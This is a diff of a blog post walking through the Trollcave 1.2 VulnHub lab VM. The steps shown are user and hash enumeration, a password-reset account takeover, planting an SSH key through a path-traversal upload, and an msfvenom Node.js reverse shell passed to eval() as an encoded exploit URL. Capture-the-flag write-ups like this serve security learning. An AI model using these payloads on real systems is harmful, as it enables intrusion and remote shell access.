@@ -18,8 +18,8 @@ This post documents the complete walkthrough of Trollcave: 1.2, a boot2root [VM]
 
 ### Background
 
-**Trollcave** is a vulnerable VM, in the tradition of [VulnHub][3] and [infosec wargames](https://en.wikipedia.org/wiki/Wargame_(hacking)) in general. You start with a virtual machine which you know nothing about – no usernames, no passwords, just what you can see on the network. In this instance, you'll see a simple community blogging website with a bunch of users. From this initial point, you enumerate the machine's running services and general characteristics and devise ways to gain complete control over it by finding and exploiting vulnerabilities and misconfigurations.
- 
+**Trollcave** is a vulnerable VM, in the tradition of [VulnHub][3] and [infosec wargames](https://en.wikipedia.org/wiki/Wargame_(hacking)) in general. You start with a virtual machine which you know nothing about – no usernames, no passwords. In this instance, you'll see a simple community blogging website with a bunch of users. From this initial point, you enumerate the machine's running services and general characteristics and devise ways to gain complete control over it by finding and exploiting vulnerabilities and misconfigurations.
+
 Your first goal is to abuse the services on the machine to gain unauthorized shell access. Your ultimate goal is to read a text file in the `root` user's home directory (`/root/flag.txt`).
 
 ### Information Gathering
@@ -30,15 +30,15 @@ Let's kick this off with a `nmap` scan to establish the services available in th
 ...
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
 |   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
 |_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
 80/tcp open  http    syn-ack ttl 64 nginx 1.10.3 (Ubuntu)
 |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_/
 |_http-server-header: nginx/1.10.3 (Ubuntu)
 |_http-title: Trollcave
@@ -82,7 +82,7 @@ ID	Response   Lines      Word         Chars          Payload
 
 ### Ruby on Rails
 
-After navigating around the site for a bit, I noticed many [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs which led me to believe this site was built as a Ruby on Rails (RoR) web application.
+After navigating around the site for a bit, I noticed [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs which led me to believe this site is a Ruby on Rails (RoR) web application.
 
 ```
 # curl -s http://192.168.30.128/ | grep -Po '(href|src)=".{2,}"' | cut -d'"' -f2 | sort
@@ -96,7 +96,6 @@ After navigating around the site for a bit, I noticed many [REST](https://en.wik
 /blogs/7
 /login
 /register
-/register
 /uploads/coderguy/ruby.png
 /uploads/cooldude89/poochie.jpg
 /uploads/dave/dave.png
@@ -108,7 +107,6 @@ After navigating around the site for a bit, I noticed many [REST](https://en.wik
 /users/17
 /users/2
 /users/4
-/users/5
 /users/5
 ```
 
@@ -144,7 +142,7 @@ I was able to enumerate the users of the site using nothing more than `curl` and
 
 ### Enumerating Password Hashes
 
-Using the same technique against `/reports`, I was able to enumerate four password digest or hash. 
+Using the same technique against `/reports`, I was able to enumerate four password digest or hash.
 
 ```
 # curl -s 192.168.30.128/reports/{1..20}.json | jq -jaM
@@ -184,11 +182,11 @@ Using the same technique against `/reports`, I was able to enumerate four passwo
 ...
 ```
 
-The passwords were hashed with `bcrypt` which was unfortunate because of the computational costs (10 rounds), cracking these hashes will be a futile exercise and a waste of CPU cycles. A more efficient way is needed.
+The passwords hashed with `bcrypt` had salt and a computational cost of 10 rounds, cracking them would be a futile exercise and a waste of CPU cycles. We need a better way.
 
 ### Password Reset
 
-Recall the blog post above on `password_resets`? Turned out that the very well-received Ruby on Rails [tutorial](https://www.railstutorial.org/book) had a [chapter](https://www.railstutorial.org/book/password_reset) on it and provided a huge clue on how to proceed.
+Recall the blog post above on `password_resets`? Turned out that the well-received Ruby on Rails [tutorial](https://www.railstutorial.org/book) had a [chapter](https://www.railstutorial.org/book/password_reset) on it and provided a clue on how to proceed.
 
 ![screenshot-3](/assets/images/posts/trollcave-walkthrough/screenshot-3.png)
 
@@ -196,33 +194,33 @@ Using the URL `/password_resets/new`, I was able to navigate to the password res
 
 ![screenshot-4](/assets/images/posts/trollcave-walkthrough/screenshot-4.png)
 
-The initial attempt to reset King's password (**Superadmin**) failed because only normal members' passwords can be reset. Well, let's just reset the password of an ordinary member and see what happens.
+The initial attempt to reset King's password (**Superadmin**) failed because password reset was for normal members. Well, let's reset the password of an ordinary member and see what happens.
 
-Just as it was mentioned in the blog post, the mailer had an issue resulting in the password reset URL presenting itself like so.
+As described in the blog post, the mailer had an issue resulting in the password reset URL presenting itself like so.
 
 ![screenshot-5](/assets/images/posts/trollcave-walkthrough/screenshot-5.png)
 
-Noticed the name of the user in the password reset URL? We could very well abuse it to reset the **Superadmin**'s password.
+Noticed the username in the password reset URL? We could abuse it to reset the King's password.
 
 ![screenshot-6](/assets/images/posts/trollcave-walkthrough/screenshot-6.png)
 
 ![screenshot-7](/assets/images/posts/trollcave-walkthrough/screenshot-7.png)
 
-Boom! I'm the King (**Superadmin**) :crown:
+Boom! I'm the King (**Superadmin**) now :crown:
 
 ### File Manager
 
-The sight of **File manager** caught my attention immediately since that's a pretty common way of putting files under the attacker's control into the environment.
+The sight of **File manager** caught my attention since that's a pretty common way of putting files under the attacker's control into the environment.
 
-The first file that I tried to upload was just some random text to see if there's any kind of filtering in place.
+The first file that I tried to upload was some random text to see if there's any kind of filtering in place.
 
 ![screenshot-8](/assets/images/posts/trollcave-walkthrough/screenshot-8.png)
 
-The first obstacle I encountered was that file uploading is disabled. Well, I'm the **Superadmin** remember? I can simply go to the **Admin panel** to enable it.
+The first obstacle I encountered - not being able to upload anything. Well, I'm the **Superadmin** remember? I could go to the **Admin panel** to enable it.
 
 ![screenshot-9](/assets/images/posts/trollcave-walkthrough/screenshot-9.png)
 
-Now that I can upload file, what kind of file should I upload? RoR is not PHP and there's no point in uploading `.rb` files if you knew the directory structure of a RoR application.
+Now that I'm able to upload files, what kind of file should I upload? RoR is not PHP and there's no point in uploading `.rb` files if you knew the directory structure of a RoR application.
 
 ![screenshot-10](/assets/images/posts/trollcave-walkthrough/screenshot-10.png)
 
@@ -230,15 +228,15 @@ Let's see what happens when I upload a text file for a start.
 
 ![screenshot-11](/assets/images/posts/trollcave-walkthrough/screenshot-11.png)
 
-Once the file is uploaded, we can view the file information simply by going to `/user_files/[file_number]` or `/user_files/[file_number].json` like this.
+Once I've uploaded the file, I was able to view the file information by going to `/user_files/[file_number]` or `/user_files/[file_number].json` like this.
 
 ![screenshot-12](/assets/images/posts/trollcave-walkthrough/screenshot-12.png)
 
-Now that we know the absolute path of where the file is uploaded to, we can start to explore how to exploit this. At the upload page, we saw that an alternative file name can also be provided. Could this be the ticket in?
+Now that we know the file's absolute path, we can start to explore how to exploit this. At the upload page, we saw that we can also provide an alternative file name. Could this be the ticket in?
 
-When I gained access to **Superadmin** , more blog posts were unlocked and I saw one particular blog post and comment that could potentially be the key information to gaining access.
+When I gained access to **Superadmin** , I unlocked more blog posts and I saw a particular blog post and comment that could potentially be the key information to gaining access.
 
-_User `rails` is present. Maybe SSH is possible?_
+_User `rails` is present. SSH is possible?_
 
 ![screenshot-13](/assets/images/posts/trollcave-walkthrough/screenshot-13.png)
 
@@ -254,8 +252,8 @@ First, let's generate a SSH keypair (RSA) with `ssh-keygen`
 # ssh-keygen -t rsa -b 2048
 Generating public/private rsa key pair.
 Enter file in which to save the key (/root/.ssh/id_rsa): trollcave
-Enter passphrase (empty for no passphrase): 
-Enter same passphrase again: 
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
 Your identification has been saved in trollcave.
 Your public key has been saved in trollcave.pub.
 The key fingerprint is:
@@ -278,7 +276,7 @@ Next, we upload `trollcave.pub` to `/home/rails/.ssh/authorized_keys` with a tra
 
 ![screenshot-15](/assets/images/posts/trollcave-walkthrough/screenshot-15.png)
 
-Let's verify that the public key has indeed been uploaded.
+Let's verify that I've uploaded the public key.
 
 ![screenshot-16](/assets/images/posts/trollcave-walkthrough/screenshot-16.png)
 
@@ -312,9 +310,9 @@ According to [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Refer
 
 >The argument of the `eval()` function is a string. If the string represents an expression, `eval()` evaluates the expression. If the argument represents one or more JavaScript statements, `eval()` evaluates the statements. Do not call `eval()` to evaluate an arithmetic expression; JavaScript evaluates arithmetic expressions automatically.
 
-There is one small caveat though. Noticed `toString()` is appended to `eval()`? We just have to make sure a string is returned to whatever that was evaluated.
+One small caveat. Noticed `toString()` after `eval()`? We need to make sure the evaluation returned a string!
 
-Fortunately, `msfvenom` is able to generate a Node.js reverse shell payload. 
+Good thing `msfvenom` was able to generate a Node.js reverse shell payload.
 
 ```
 # msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.30.128 LPORT=44444 -o rev.js
@@ -323,7 +321,7 @@ Fortunately, `msfvenom` is able to generate a Node.js reverse shell payload.
 
 We also need to ensure that our payload is a string. To do that, we could encode our payload into ordinal numbers and piece them back together with `String.fromCharCode()`.
 
-The following Python code does that.
+The following Python code did that.
 
 {% highlight python linenos %}
 # cat encode.py
@@ -344,7 +342,7 @@ All that's left is to forward local port `tcp/9999` to remote port `tcp/8888` so
 
 ![screenshot-22](/assets/images/posts/trollcave-walkthrough/screenshot-22.png)
 
-The final exploit URL goes like this.
+The final exploit URL looked like this.
 
 ```
 http://localhost:9999/calc?sum=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,123,32,118,97,114,32,114,101,113,117,105,114,101,32,61,32,103,108,111,98,97,108,46,114,101,113,117,105,114,101,32,124,124,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,59,32,105,102,32,40,33,114,101,113,117,105,114,101,41,32,114,101,116,117,114,110,59,32,118,97,114,32,99,109,100,32,61,32,40,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,112,108,97,116,102,111,114,109,46,109,97,116,99,104,40,47,94,119,105,110,47,105,41,41,32,63,32,34,99,109,100,34,32,58,32,34,47,98,105,110,47,115,104,34,59,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,34,110,101,116,34,41,44,32,99,112,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,44,32,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,34,117,116,105,108,34,41,44,32,115,104,32,61,32,99,112,46,115,112,97,119,110,40,99,109,100,44,32,91,93,41,59,32,118,97,114,32,99,108,105,101,110,116,32,61,32,116,104,105,115,59,32,118,97,114,32,99,111,117,110,116,101,114,61,48,59,32,102,117,110,99,116,105,111,110,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,32,61,32,110,101,116,46,99,111,110,110,101,99,116,40,52,52,52,52,52,44,32,34,49,57,50,46,49,54,56,46,51,48,46,49,50,56,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,105,102,32,40,116,121,112,101,111,102,32,117,116,105,108,46,112,117,109,112,32,61,61,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,101,108,115,101,32,123,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,101,114,114,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,125,41,59,32,115,111,99,107,101,116,46,111,110,40,34,101,114,114,111,114,34,44,32,102,117,110,99,116,105,111,110,40,101,114,114,111,114,41,32,123,32,99,111,117,110,116,101,114,43,43,59,32,105,102,40,99,111,117,110,116,101,114,60,61,32,49,48,41,123,32,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,125,44,32,53,42,49,48,48,48,41,59,32,125,32,101,108,115,101,32,112,114,111,99,101,115,115,46,101,120,105,116,40,41,59,32,125,41,59,32,125,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,32,125,41,40,41,59,49,43,49,59,10))`
@@ -358,7 +356,7 @@ On my `netcat` listener, this is what I got.
 
 ### Afterthought
 
-This was an excellent opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js) both I've heard many good things but never really got the chance to dig deeper until now.
+This was the perfect opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js). I've heard positive reviews from the **webdev** community (not that I'm using them professionally) but never got the chance to dig deeper until now.
 
 I rate this VM highly educational and fun.
 
@@ -367,3 +365,4 @@ I rate this VM highly educational and fun.
 [3]: https://www.vulnhub.com
 
 *[JSON]: JavaScript Object Notation
+*[RoR]: Ruby on Rails
